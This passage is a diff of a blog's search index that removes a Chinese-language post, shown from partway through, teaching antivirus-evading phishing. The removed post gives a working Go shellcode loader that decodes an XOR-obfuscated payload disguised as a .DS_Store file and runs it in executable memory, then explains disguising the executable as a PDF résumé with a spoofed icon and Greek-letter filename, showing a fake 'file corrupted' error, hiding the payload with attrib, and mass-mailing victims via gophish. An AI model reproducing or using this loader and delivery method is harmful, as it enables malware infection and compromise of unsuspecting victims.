class="line">PAGE_EXECUTE_READWRITE = <span class="number">0x40</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> kk = []<span class="type">byte</span>&#123;<span class="number">0x1b</span>, <span class="number">0x51</span>,<span class="number">0x11</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">kernel32      = syscall.MustLoadDLL(<span class="string">&quot;kernel32.dll&quot;</span>)</span><br><span class="line">ntdll         = syscall.MustLoadDLL(<span class="string">&quot;ntdll.dll&quot;</span>)</span><br><span class="line">VirtualAlloc  = kernel32.MustFindProc(<span class="string">&quot;VirtualAlloc&quot;</span>)</span><br><span class="line">RtlCopyMemory = ntdll.MustFindProc(<span class="string">&quot;RtlCopyMemory&quot;</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">content, err := ioutil.ReadFile(<span class="string">&quot;.DS_Store&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">	fmt.Println(<span class="string">&quot;Error reading file:&quot;</span>, err)</span><br><span class="line">	<span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="type">string</span>(content)</span><br><span class="line"></span><br><span class="line">charcode := DD(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">addr, _, err := VirtualAlloc.Call(<span class="number">0</span>, <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_, _, err = RtlCopyMemory.Call(addr, (<span class="type">uintptr</span>)(unsafe.Pointer(&amp;charcode[<span class="number">0</span>])), <span class="type">uintptr</span>(<span class="built_in">len</span>(charcode)))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &amp;&amp; err.Error() != <span class="string">&quot;The operation completed successfully.&quot;</span> &#123;</span><br><span class="line">syscall.Exit(<span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line">syscall.Syscall(addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DD</span><span class="params">(src <span class="type">string</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">ss, _ := base64.StdEncoding.DecodeString(src)</span><br><span class="line"><span class="keyword">var</span> shellcode []<span class="type">byte</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(ss); i++ &#123;</span><br><span class="line">shellcode = <span class="built_in">append</span>(shellcode, ss[i]^kk[<span class="number">1</span>]^kk[<span class="number">2</span>])</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> shellcode</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>编译生成可执行文件shell.exe</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">go build -ldflags=&quot;-s -w -H=windowsgui&quot; shell.go</span><br></pre></td></tr></table></figure>
-<p><img src="image-20230604163030198.png" alt="image-20230604163030198"></p>
-<p>双击后可发现木马成功上线（2023.6.4测试）</p>
-<p><img src="image-20230604163823173.png" alt="image-20230604163823173"></p>
-<h1 id="伪装">伪装</h1>
-<p>要想让鱼上钩就必须做好伪装,发送一个shell.exe只有傻子才会点,所以我们一般将文件伪装成一个pdf文档发送</p>
-<p>给受害者</p>
-<h2 id="pdf图标-命名">pdf图标+命名</h2>
-<p>使用<code>iconsext.exe</code>提取一个电脑上自带的pdf图标,我这里选择edge的pdf图标,得到对应的ico文件</p>
-<p>再利用<code>ico替换.exe</code>将shell.exe的图标替换</p>
-<p><img src="image-20230604170107321.png" alt="image-20230604170107321"></p>
-<p>接下来改个后缀,这里不能直接使用pdf.exe,也不能使用空格填充,因为360发现这种文件会直接查杀,所以我们可以找个特殊字符来替换pdf,并且让文件名字尽可能的长,尽量让受害者注意不到最后的exe,这里使用希腊字母的Ρ来代替,名字改为<code>xxxx大学_xxxx学院_xxxx专业_xxxxx个人简历.ΡDF.exe</code></p>
-<h2 id="文档报错">文档报错</h2>
-<p>可以利用GoFileBinder将shell.exe和一个正常的pdf文档绑定起来,打开exe后是一个正常的pdf文件,同时机器也会在后台悄悄上线,但如果我们钓鱼的目标不一样,那么对应打卡的pdf文档也要不一样,有的是一份简历,有的是一份通告……所以最方便的方法就是让受害者打开pdf后直接弹窗报错</p>
-<p>这里使用MessageBoxW这个api,代码如下</p>
-<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">MessageBoxPlain(<span class="string">&quot;提示&quot;</span>, <span class="string">&quot;文件已损坏,无法打开&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBoxPlain</span><span class="params">(title, caption <span class="type">string</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> (</span><br><span class="line">        NULL = <span class="number">0</span></span><br><span class="line">        MB_OK = <span class="number">0</span></span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> MessageBox(NULL, caption, title, MB_OK)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">MessageBox</span><span class="params">(hwnd <span class="type">uintptr</span>, caption, title <span class="type">string</span>, flags <span class="type">uint</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    ret, _, _ := syscall.NewLazyDLL(<span class="string">&quot;user32.dll&quot;</span>).NewProc(<span class="string">&quot;MessageBoxW&quot;</span>).Call(</span><br><span class="line">        <span class="type">uintptr</span>(hwnd),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(caption))),</span><br><span class="line">        <span class="type">uintptr</span>(unsafe.Pointer(syscall.StringToUTF16Ptr(title))),</span><br><span class="line">        <span class="type">uintptr</span>(flags))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="type">int</span>(ret)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>效果：</p>
-<p><img src="image-20230604164839058.png" alt="image-20230604164839058"></p>
-<p>将上述代码写入到shell.go中即可实现弹窗（位置要在syscall.Syscall(addr, 0, 0, 0, 0)上方,要先弹窗再执行shellcode）</p>
-<h2 id="隐藏文件">隐藏文件</h2>
-<p>.DS_Store（Desktop Services Store）文件是苹果公司操作系统 macOS 下用于存储目录的自定义属性和元数据的隐藏文件。这些属性和元数据包括文件夹的位置、图标、背景和视图选项等信息,可以帮助操作系统快速访问和渲染文件夹。在 macOS 的 Finder 中,每个文件夹都有一个与之对应的 .DS_Store 文件,它会随着文件夹的创建、打开、关闭和移动等操作而被创建或更新。</p>
-<p>这里将shellcode代码文件命名为.DS_Store就是为了减少受害者使用解压软件浏览压缩包时的疑心</p>
-<p>可以将.DS_Store文件设为隐藏文件来达到解压完后文件消失的效果,但是如果受害者开启了“查看隐藏项目”,那将会暴露该文件,可以使用以下命令将文件进行进一步的隐藏</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">attrib +S +H .DS_Store</span><br></pre></td></tr></table></figure>
-<p>这下就算开了“查看隐藏项目”也无法看到隐藏的文件</p>
-<p><img src="image-20230604173322404.png" alt="image-20230604173322404"></p>
-<p>这时候就可以打个压缩包发给受害者了（windows自带的压缩功能无法压缩的话使用WinRAR等第三方工具）</p>
-<p>效果：</p>
-<p><img src="image-20230604173628947.png" alt="image-20230604173628947"></p>
-<p><img src="image-20230604173846465.png" alt="image-20230604173846465"></p>
-<h1 id="钓鱼平台">钓鱼平台</h1>
-<p>这里使用gophish搭建钓鱼平台,详细的搭建指南可以查看<a href="http://blog.leanote.com/post/snowming/a6b66097bccd">这篇文章</a></p>
-<p>利用gophish我们可以自定义发件人和批量发送邮件到目标邮箱</p>
-<p>效果截图</p>
-<p><img src="image-20230604214339030.png" alt="image-20230604214339030"></p>
-<p>参考：</p>
-<p><a href="https://xz.aliyun.com/t/11885#toc-4">记一个常规的免杀钓鱼流程</a></p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>免杀</tag>
-        <tag>社工</tag>
+        <tag>ipv6</tag>
+        <tag>服务器</tag>
       </tags>
   </entry>
 </search>
